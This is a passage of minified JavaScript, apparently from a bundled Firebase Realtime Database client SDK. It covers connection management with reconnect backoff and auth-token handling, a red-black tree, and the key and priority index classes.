 */const Li=1e3,BR=60*5*1e3,Gp=30*1e3,HR=1.3,WR=3e4,$R="server_kill",Kp=3;class jt extends py{constructor(e,n,r,i,s,o,l,a){if(super(),this.repoInfo_=e,this.applicationId_=n,this.onDataUpdate_=r,this.onConnectStatus_=i,this.onServerInfoUpdate_=s,this.authTokenProvider_=o,this.appCheckTokenProvider_=l,this.authOverride_=a,this.id=jt.nextPersistentConnectionId_++,this.log_=Js("p:"+this.id+":"),this.interruptReasons_={},this.listens=new Map,this.outstandingPuts_=[],this.outstandingGets_=[],this.outstandingPutCount_=0,this.outstandingGetCount_=0,this.onDisconnectRequestQueue_=[],this.connected_=!1,this.reconnectDelay_=Li,this.maxReconnectDelay_=BR,this.securityDebugCallback_=null,this.lastSessionId=null,this.establishConnectionTimer_=null,this.visible_=!1,this.requestCBHash_={},this.requestNumber_=0,this.realtime_=null,this.authToken_=null,this.appCheckToken_=null,this.forceTokenRefresh_=!1,this.invalidAuthTokenCount_=0,this.invalidAppCheckTokenCount_=0,this.firstConnection_=!0,this.lastConnectionAttemptTime_=null,this.lastConnectionEstablishedTime_=null,a&&!lv())throw new Error("Auth override specified in options, but not supported on non Node.js platforms");lh.getInstance().on("visible",this.onVisible_,this),e.host.indexOf("fblocal")===-1&&Ol.getInstance().on("online",this.onOnline_,this)}sendRequest(e,n,r){const i=++this.requestNumber_,s={r:i,a:e,b:n};this.log_(ye(s)),S(this.connected_,"sendRequest call when we're not connected not allowed."),this.realtime_.sendRequest(s),r&&(this.requestCBHash_[i]=r)}get(e){this.initConnection_();const n=new ca,i={action:"g",request:{p:e._path.toString(),q:e._queryObject},onComplete:o=>{const l=o.d;o.s==="ok"?n.resolve(l):n.reject(l)}};this.outstandingGets_.push(i),this.outstandingGetCount_++;const s=this.outstandingGets_.length-1;return this.connected_&&this.sendGet_(s),n.promise}listen(e,n,r,i){this.initConnection_();const s=e._queryIdentifier,o=e._path.toString();this.log_("Listen called for "+o+" "+s),this.listens.has(o)||this.listens.set(o,new Map),S(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"listen() called for non-default but complete query"),S(!this.listens.get(o).has(s),"listen() called twice for same path/queryId.");const l={onComplete:i,hashFn:n,query:e,tag:r};this.listens.get(o).set(s,l),this.connected_&&this.sendListen_(l)}sendGet_(e){const n=this.outstandingGets_[e];this.sendRequest("g",n.request,r=>{delete this.outstandingGets_[e],this.outstandingGetCount_--,this.outstandingGetCount_===0&&(this.outstandingGets_=[]),n.onComplete&&n.onComplete(r)})}sendListen_(e){const n=e.query,r=n._path.toString(),i=n._queryIdentifier;this.log_("Listen on "+r+" for "+i);const s={p:r},o="q";e.tag&&(s.q=n._queryObject,s.t=e.tag),s.h=e.hashFn(),this.sendRequest(o,s,l=>{const a=l.d,u=l.s;jt.warnOnListenWarnings_(a,n),(this.listens.get(r)&&this.listens.get(r).get(i))===e&&(this.log_("listen response",l),u!=="ok"&&this.removeListen_(r,i),e.onComplete&&e.onComplete(u,a))})}static warnOnListenWarnings_(e,n){if(e&&typeof e=="object"&&Qt(e,"w")){const r=li(e,"w");if(Array.isArray(r)&&~r.indexOf("no_index")){const i='".indexOn": "'+n._queryParams.getIndex().toString()+'"',s=n._path.toString();qe(`Using an unspecified index. Your data will be downloaded and filtered on the client. Consider adding ${i} at ${s} to your security rules for better performance.`)}}}refreshAuthToken(e){this.authToken_=e,this.log_("Auth token refreshed"),this.authToken_?this.tryAuth():this.connected_&&this.sendRequest("unauth",{},()=>{}),this.reduceReconnectDelayIfAdminCredential_(e)}reduceReconnectDelayIfAdminCredential_(e){(e&&e.length===40||TS(e))&&(this.log_("Admin auth credential detected.  Reducing max reconnect time."),this.maxReconnectDelay_=Gp)}refreshAppCheckToken(e){this.appCheckToken_=e,this.log_("App check token refreshed"),this.appCheckToken_?this.tryAppCheck():this.connected_&&this.sendRequest("unappeck",{},()=>{})}tryAuth(){if(this.connected_&&this.authToken_){const e=this.authToken_,n=SS(e)?"auth":"gauth",r={cred:e};this.authOverride_===null?r.noauth=!0:typeof this.authOverride_=="object"&&(r.authvar=this.authOverride_),this.sendRequest(n,r,i=>{const s=i.s,o=i.d||"error";this.authToken_===e&&(s==="ok"?this.invalidAuthTokenCount_=0:this.onAuthRevoked_(s,o))})}}tryAppCheck(){this.connected_&&this.appCheckToken_&&this.sendRequest("appcheck",{token:this.appCheckToken_},e=>{const n=e.s,r=e.d||"error";n==="ok"?this.invalidAppCheckTokenCount_=0:this.onAppCheckRevoked_(n,r)})}unlisten(e,n){const r=e._path.toString(),i=e._queryIdentifier;this.log_("Unlisten called for "+r+" "+i),S(e._queryParams.isDefault()||!e._queryParams.loadsAllData(),"unlisten() called for non-default but complete query"),this.removeListen_(r,i)&&this.connected_&&this.sendUnlisten_(r,i,e._queryObject,n)}sendUnlisten_(e,n,r,i){this.log_("Unlisten on "+e+" for "+n);const s={p:e},o="n";i&&(s.q=r,s.t=i),this.sendRequest(o,s)}onDisconnectPut(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"o",data:n,onComplete:r})}onDisconnectMerge(e,n,r){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",e,n,r):this.onDisconnectRequestQueue_.push({pathString:e,action:"om",data:n,onComplete:r})}onDisconnectCancel(e,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",e,null,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"oc",data:null,onComplete:n})}sendOnDisconnect_(e,n,r,i){const s={p:n,d:r};this.log_("onDisconnect "+e,s),this.sendRequest(e,s,o=>{i&&setTimeout(()=>{i(o.s,o.d)},Math.floor(0))})}put(e,n,r,i){this.putInternal("p",e,n,r,i)}merge(e,n,r,i){this.putInternal("m",e,n,r,i)}putInternal(e,n,r,i,s){this.initConnection_();const o={p:n,d:r};s!==void 0&&(o.h=s),this.outstandingPuts_.push({action:e,request:o,onComplete:i}),this.outstandingPutCount_++;const l=this.outstandingPuts_.length-1;this.connected_?this.sendPut_(l):this.log_("Buffering put: "+n)}sendPut_(e){const n=this.outstandingPuts_[e].action,r=this.outstandingPuts_[e].request,i=this.outstandingPuts_[e].onComplete;this.outstandingPuts_[e].queued=this.connected_,this.sendRequest(n,r,s=>{this.log_(n+" response",s),delete this.outstandingPuts_[e],this.outstandingPutCount_--,this.outstandingPutCount_===0&&(this.outstandingPuts_=[]),i&&i(s.s,s.d)})}reportStats(e){if(this.connected_){const n={c:e};this.log_("reportStats",n),this.sendRequest("s",n,r=>{if(r.s!=="ok"){const s=r.d;this.log_("reportStats","Error sending stats: "+s)}})}}onDataMessage_(e){if("r"in e){this.log_("from server: "+ye(e));const n=e.r,r=this.requestCBHash_[n];r&&(delete this.requestCBHash_[n],r(e.b))}else{if("error"in e)throw"A server-side error has occurred: "+e.error;"a"in e&&this.onDataPush_(e.a,e.b)}}onDataPush_(e,n){this.log_("handleServerMessage",e,n),e==="d"?this.onDataUpdate_(n.p,n.d,!1,n.t):e==="m"?this.onDataUpdate_(n.p,n.d,!0,n.t):e==="c"?this.onListenRevoked_(n.p,n.q):e==="ac"?this.onAuthRevoked_(n.s,n.d):e==="apc"?this.onAppCheckRevoked_(n.s,n.d):e==="sd"?this.onSecurityDebugPacket_(n):Ic("Unrecognized action received from server: "+ye(e)+`
Are you using the latest client?`)}onReady_(e,n){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=new Date().getTime(),this.handleTimestamp_(e),this.lastSessionId=n,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)}scheduleConnect_(e){S(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout(()=>{this.establishConnectionTimer_=null,this.establishConnection_()},Math.floor(e))}initConnection_(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)}onVisible_(e){e&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=Li,this.realtime_||this.scheduleConnect_(0)),this.visible_=e}onOnline_(e){e?(this.log_("Browser went online."),this.reconnectDelay_=Li,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())}onRealtimeDisconnect_(){if(this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()){this.visible_?this.lastConnectionEstablishedTime_&&(new Date().getTime()-this.lastConnectionEstablishedTime_>WR&&(this.reconnectDelay_=Li),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=new Date().getTime());const e=new Date().getTime()-this.lastConnectionAttemptTime_;let n=Math.max(0,this.reconnectDelay_-e);n=Math.random()*n,this.log_("Trying to reconnect in "+n+"ms"),this.scheduleConnect_(n),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,this.reconnectDelay_*HR)}this.onConnectStatus_(!1)}async establishConnection_(){if(this.shouldReconnect_()){this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=new Date().getTime(),this.lastConnectionEstablishedTime_=null;const e=this.onDataMessage_.bind(this),n=this.onReady_.bind(this),r=this.onRealtimeDisconnect_.bind(this),i=this.id+":"+jt.nextConnectionId_++,s=this.lastSessionId;let o=!1,l=null;const a=function(){l?l.close():(o=!0,r())},u=function(d){S(l,"sendRequest call when we're not connected not allowed."),l.sendRequest(d)};this.realtime_={close:a,sendRequest:u};const c=this.forceTokenRefresh_;this.forceTokenRefresh_=!1;try{const[d,h]=await Promise.all([this.authTokenProvider_.getToken(c),this.appCheckTokenProvider_.getToken(c)]);o?Pe("getToken() completed but was canceled"):(Pe("getToken() completed. Creating connection."),this.authToken_=d&&d.accessToken,this.appCheckToken_=h&&h.token,l=new MR(i,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,e,n,r,m=>{qe(m+" ("+this.repoInfo_.toString()+")"),this.interrupt($R)},s))}catch(d){this.log_("Failed to get token: "+d),o||(this.repoInfo_.nodeAdmin&&qe(d),a())}}}interrupt(e){Pe("Interrupting connection for reason: "+e),this.interruptReasons_[e]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())}resume(e){Pe("Resuming connection for reason: "+e),delete this.interruptReasons_[e],gc(this.interruptReasons_)&&(this.reconnectDelay_=Li,this.realtime_||this.scheduleConnect_(0))}handleTimestamp_(e){const n=e-new Date().getTime();this.onServerInfoUpdate_({serverTimeOffset:n})}cancelSentTransactions_(){for(let e=0;e<this.outstandingPuts_.length;e++){const n=this.outstandingPuts_[e];n&&"h"in n.request&&n.queued&&(n.onComplete&&n.onComplete("disconnect"),delete this.outstandingPuts_[e],this.outstandingPutCount_--)}this.outstandingPutCount_===0&&(this.outstandingPuts_=[])}onListenRevoked_(e,n){let r;n?r=n.map(s=>nh(s)).join("$"):r="default";const i=this.removeListen_(e,r);i&&i.onComplete&&i.onComplete("permission_denied")}removeListen_(e,n){const r=new q(e).toString();let i;if(this.listens.has(r)){const s=this.listens.get(r);i=s.get(n),s.delete(n),s.size===0&&this.listens.delete(r)}else i=void 0;return i}onAuthRevoked_(e,n){Pe("Auth token revoked: "+e+"/"+n),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),(e==="invalid_token"||e==="permission_denied")&&(this.invalidAuthTokenCount_++,this.invalidAuthTokenCount_>=Kp&&(this.reconnectDelay_=Gp,this.authTokenProvider_.notifyForInvalidToken()))}onAppCheckRevoked_(e,n){Pe("App check token revoked: "+e+"/"+n),this.appCheckToken_=null,this.forceTokenRefresh_=!0,(e==="invalid_token"||e==="permission_denied")&&(this.invalidAppCheckTokenCount_++,this.invalidAppCheckTokenCount_>=Kp&&this.appCheckTokenProvider_.notifyForInvalidToken())}onSecurityDebugPacket_(e){this.securityDebugCallback_?this.securityDebugCallback_(e):"msg"in e&&console.log("FIREBASE: "+e.msg.replace(`
`,`
FIREBASE: `))}restoreState_(){this.tryAuth(),this.tryAppCheck();for(const e of this.listens.values())for(const n of e.values())this.sendListen_(n);for(let e=0;e<this.outstandingPuts_.length;e++)this.outstandingPuts_[e]&&this.sendPut_(e);for(;this.onDisconnectRequestQueue_.length;){const e=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(e.action,e.pathString,e.data,e.onComplete)}for(let e=0;e<this.outstandingGets_.length;e++)this.outstandingGets_[e]&&this.sendGet_(e)}sendConnectStats_(){const e={};let n="js";e["sdk."+n+"."+qv.replace(/\./g,"-")]=1,Hd()?e["framework.cordova"]=1:ov()&&(e["framework.reactnative"]=1),this.reportStats(e)}shouldReconnect_(){const e=Ol.getInstance().currentlyOnline();return gc(this.interruptReasons_)&&e}}jt.nextPersistentConnectionId_=0;jt.nextConnectionId_=0;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class U{constructor(e,n){this.name=e,this.node=n}static Wrap(e,n){return new U(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ga{getCompare(){return this.compare.bind(this)}indexedValueChanged(e,n){const r=new U(ai,e),i=new U(ai,n);return this.compare(r,i)!==0}minPost(){return U.MIN}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Io;class wy extends ga{static get __EMPTY_NODE(){return Io}static set __EMPTY_NODE(e){Io=e}compare(e,n){return yi(e.name,n.name)}isDefinedOn(e){throw gi("KeyIndex.isDefinedOn not expected to be called.")}indexedValueChanged(e,n){return!1}minPost(){return U.MIN}maxPost(){return new U(ar,Io)}makePost(e,n){return S(typeof e=="string","KeyIndex indexValue must always be a string."),new U(e,Io)}toString(){return".key"}}const Qr=new wy;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ko{constructor(e,n,r,i,s=null){this.isReverse_=i,this.resultGenerator_=s,this.nodeStack_=[];let o=1;for(;!e.isEmpty();)if(e=e,o=n?r(e.key,n):1,i&&(o*=-1),o<0)this.isReverse_?e=e.left:e=e.right;else if(o===0){this.nodeStack_.push(e);break}else this.nodeStack_.push(e),this.isReverse_?e=e.right:e=e.left}getNext(){if(this.nodeStack_.length===0)return null;let e=this.nodeStack_.pop(),n;if(this.resultGenerator_?n=this.resultGenerator_(e.key,e.value):n={key:e.key,value:e.value},this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return n}hasNext(){return this.nodeStack_.length>0}peek(){if(this.nodeStack_.length===0)return null;const e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}}}class ve{constructor(e,n,r,i,s){this.key=e,this.value=n,this.color=r??ve.RED,this.left=i??He.EMPTY_NODE,this.right=s??He.EMPTY_NODE}copy(e,n,r,i,s){return new ve(e??this.key,n??this.value,r??this.color,i??this.left,s??this.right)}count(){return this.left.count()+1+this.right.count()}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||!!e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min_(){return this.left.isEmpty()?this:this.left.min_()}minKey(){return this.min_().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,n,r){let i=this;const s=r(e,i.key);return s<0?i=i.copy(null,null,null,i.left.insert(e,n,r),null):s===0?i=i.copy(null,n,null,null,null):i=i.copy(null,null,null,null,i.right.insert(e,n,r)),i.fixUp_()}removeMin_(){if(this.left.isEmpty())return He.EMPTY_NODE;let e=this;return!e.left.isRed_()&&!e.left.left.isRed_()&&(e=e.moveRedLeft_()),e=e.copy(null,null,null,e.left.removeMin_(),null),e.fixUp_()}remove(e,n){let r,i;if(r=this,n(e,r.key)<0)!r.left.isEmpty()&&!r.left.isRed_()&&!r.left.left.isRed_()&&(r=r.moveRedLeft_()),r=r.copy(null,null,null,r.left.remove(e,n),null);else{if(r.left.isRed_()&&(r=r.rotateRight_()),!r.right.isEmpty()&&!r.right.isRed_()&&!r.right.left.isRed_()&&(r=r.moveRedRight_()),n(e,r.key)===0){if(r.right.isEmpty())return He.EMPTY_NODE;i=r.right.min_(),r=r.copy(i.key,i.value,null,null,r.right.removeMin_())}r=r.copy(null,null,null,null,r.right.remove(e,n))}return r.fixUp_()}isRed_(){return this.color}fixUp_(){let e=this;return e.right.isRed_()&&!e.left.isRed_()&&(e=e.rotateLeft_()),e.left.isRed_()&&e.left.left.isRed_()&&(e=e.rotateRight_()),e.left.isRed_()&&e.right.isRed_()&&(e=e.colorFlip_()),e}moveRedLeft_(){let e=this.colorFlip_();return e.right.left.isRed_()&&(e=e.copy(null,null,null,null,e.right.rotateRight_()),e=e.rotateLeft_(),e=e.colorFlip_()),e}moveRedRight_(){let e=this.colorFlip_();return e.left.left.isRed_()&&(e=e.rotateRight_(),e=e.colorFlip_()),e}rotateLeft_(){const e=this.copy(null,null,ve.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight_(){const e=this.copy(null,null,ve.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip_(){const e=this.left.copy(null,null,!this.left.color,null,null),n=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,n)}checkMaxDepth_(){const e=this.check_();return Math.pow(2,e)<=this.count()+1}check_(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");const e=this.left.check_();if(e!==this.right.check_())throw new Error("Black depths differ");return e+(this.isRed_()?0:1)}}ve.RED=!0;ve.BLACK=!1;class VR{copy(e,n,r,i,s){return this}insert(e,n,r){return new ve(e,n,null)}remove(e,n){return this}count(){return 0}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}check_(){return 0}isRed_(){return!1}}class He{constructor(e,n=He.EMPTY_NODE){this.comparator_=e,this.root_=n}insert(e,n){return new He(this.comparator_,this.root_.insert(e,n,this.comparator_).copy(null,null,ve.BLACK,null,null))}remove(e){return new He(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,ve.BLACK,null,null))}get(e){let n,r=this.root_;for(;!r.isEmpty();){if(n=this.comparator_(e,r.key),n===0)return r.value;n<0?r=r.left:n>0&&(r=r.right)}return null}getPredecessorKey(e){let n,r=this.root_,i=null;for(;!r.isEmpty();)if(n=this.comparator_(e,r.key),n===0){if(r.left.isEmpty())return i?i.key:null;for(r=r.left;!r.right.isEmpty();)r=r.right;return r.key}else n<0?r=r.left:n>0&&(i=r,r=r.right);throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")}isEmpty(){return this.root_.isEmpty()}count(){return this.root_.count()}minKey(){return this.root_.minKey()}maxKey(){return this.root_.maxKey()}inorderTraversal(e){return this.root_.inorderTraversal(e)}reverseTraversal(e){return this.root_.reverseTraversal(e)}getIterator(e){return new ko(this.root_,null,this.comparator_,!1,e)}getIteratorFrom(e,n){return new ko(this.root_,e,this.comparator_,!1,n)}getReverseIteratorFrom(e,n){return new ko(this.root_,e,this.comparator_,!0,n)}getReverseIterator(e){return new ko(this.root_,null,this.comparator_,!0,e)}}He.EMPTY_NODE=new VR;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function qR(t,e){return yi(t.name,e.name)}function ah(t,e){return yi(t,e)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Rc;function GR(t){Rc=t}const Ey=function(t){return typeof t=="number"?"number:"+Xv(t):"string:"+t},Cy=function(t){if(t.isLeafNode()){const e=t.val();S(typeof e=="string"||typeof e=="number"||typeof e=="object"&&Qt(e,".sv"),"Priority must be a string or number.")}else S(t===Rc||t.isEmpty(),"priority of unexpected type.");S(t===Rc||t.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Yp;class ge{constructor(e,n=ge.__childrenNodeConstructor.EMPTY_NODE){this.value_=e,this.priorityNode_=n,this.lazyHash_=null,S(this.value_!==void 0&&this.value_!==null,"LeafNode shouldn't be created with null/undefined value."),Cy(this.priorityNode_)}static set __childrenNodeConstructor(e){Yp=e}static get __childrenNodeConstructor(){return Yp}isLeafNode(){return!0}getPriority(){return this.priorityNode_}updatePriority(e){return new ge(this.value_,e)}getImmediateChild(e){return e===".priority"?this.priorityNode_:ge.__childrenNodeConstructor.EMPTY_NODE}getChild(e){return j(e)?this:M(e)===".priority"?this.priorityNode_:ge.__childrenNodeConstructor.EMPTY_NODE}hasChild(){return!1}getPredecessorChildName(e,n){return null}updateImmediateChild(e,n){return e===".priority"?this.updatePriority(n):n.isEmpty()&&e!==".priority"?this:ge.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(e,n).updatePriority(this.priorityNode_)}updateChild(e,n){const r=M(e);return r===null?n:n.isEmpty()&&r!==".priority"?this:(S(r!==".priority"||Nn(e)===1,".priority must be the last token in a path"),this.updateImmediateChild(r,ge.__childrenNodeConstructor.EMPTY_NODE.updateChild(G(e),n)))}isEmpty(){return!1}numChildren(){return 0}forEachChild(e,n){return!1}val(e){return e&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()}hash(){if(this.lazyHash_===null){let e="";this.priorityNode_.isEmpty()||(e+="priority:"+Ey(this.priorityNode_.val())+":");const n=typeof this.value_;e+=n+":",n==="number"?e+=Xv(this.value_):e+=this.value_,this.lazyHash_=Kv(e)}return this.lazyHash_}getValue(){return this.value_}compareTo(e){return e===ge.__childrenNodeConstructor.EMPTY_NODE?1:e instanceof ge.__childrenNodeConstructor?-1:(S(e.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(e))}compareToLeafNode_(e){const n=typeof e.value_,r=typeof this.value_,i=ge.VALUE_TYPE_ORDER.indexOf(n),s=ge.VALUE_TYPE_ORDER.indexOf(r);return S(i>=0,"Unknown leaf type: "+n),S(s>=0,"Unknown leaf type: "+r),i===s?r==="object"?0:this.value_<e.value_?-1:this.value_===e.value_?0:1:s-i}withIndex(){return this}isIndexed(){return!0}equals(e){if(e===this)return!0;if(e.isLeafNode()){const n=e;return this.value_===n.value_&&this.priorityNode_.equals(n.priorityNode_)}else return!1}}ge.VALUE_TYPE_ORDER=["object","boolean","number","string"];/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Sy,Ty;function KR(t){Sy=t}function YR(t){Ty=t}class QR extends ga{compare(e,n){const r=e.node.getPriority(),i=n.node.getPriority(),s=r.compareTo(i);return s===0?yi(e.name,n.name):s}isDefinedOn(e){return!e.getPriority().isEmpty()}indexedValueChanged(e,n){return!e.getPriority().equals(n.getPriority())}minPost(){return U.MIN}maxPost(){return new U(ar,new ge("[PRIORITY-POST]",Ty))}makePost(e,n){const r=Sy(e);return new U(n,new ge("[PRIORITY-POST]",r))}toString(){return".priority"}}const le=new QR;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const XR=Math.log(2);class JR{constructor(e){const n=s=>parseInt(Math.log(s)/XR,10),r=s=>parseInt(Array(s+1).join("1"),2);this.count=n(e+1),this.current_=this.count-1;const i=r(this.count);this.bits_=e+1&i}nextBitIsOne(){const e=!(this.bits_&1<<this.current_);return this.current_--,e}}const bl=function(t,e,n,r){t.sort(e);const i=function(a,u){const c=u-a;let d,h;if(c===0)return null;if(c===1)return d=t[a],h=n?n(d):d,new ve(h,d.node,ve.BLACK,null,null);{const m=parseInt(c/2,10)+a,_=i(a,m),v=i(m+1,u);return d=t[m],h=n?n(d):d,new ve(h,d.node,ve.BLACK,_,v)}},s=function(a){let u=null,c=null,d=t.length;const h=function(_,v){const w=d-_,p=d;d-=_;const f=i(w+1,p),g=t[w],y=n?n(g):g;m(new ve(y,g.node,v,null,f))},m=function(_){u?(u.left=_,u=_):(c=_,u=_)};for(let _=0;_<a.count;++_){const v=a.nextBitIsOne(),w=Math.pow(2,a.count-(_+1));v?h(w,ve.BLACK):(h(w,ve.BLACK),h(w,ve.RED))}return c},o=new JR(t.length),l=s(o);return new He(r||e,l)};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let fu;const Cr={};class Ut{constructor(e,n){this.indexes_=e,this.indexSet_=n}static get Default(){return S(Cr&&le,"ChildrenNode.ts has not been loaded"),fu=fu||new Ut({".priority":Cr},{".priority":le}),fu}get(e){const n=li(this.indexes_,e);if(!n)throw new Error("No index defined for "+e);return n instanceof He?n:null}hasIndex(e){return Qt(this.indexSet_,e.toString())}addIndex(e,n){S(e!==Qr,"KeyIndex always exists and isn't meant to be added to the IndexMap.");const r=[];let i=!1;const s=n.getIterator(U.Wrap);let o=s.getNext();for(;o;)i=i||e.isDefinedOn(o.node),r.push(o),o=s.getNext();let l;i?l=bl(r,e.getCompare()):l=Cr;const a=e.toString(),u=Object.assign({},this.indexSet_);u[a]=e;const c=Object.assign({},this.indexes_);return c[a]=l,new Ut(c,u)}addToIndexes(e,n){const r=Cl(this.indexes_,(i,s)=>{const o=li(this.indexSet_,s);if(S(o,"Missing index implementation for "+s),i===Cr)if(o.isDefinedOn(e.node)){const l=[],a=n.getIterator(U.Wrap);let u=a.getNext();for(;u;)u.name!==e.name&&l.push(u),u=a.getNext();return l.push(e),bl(l,o.getCompare())}else return Cr;else{const 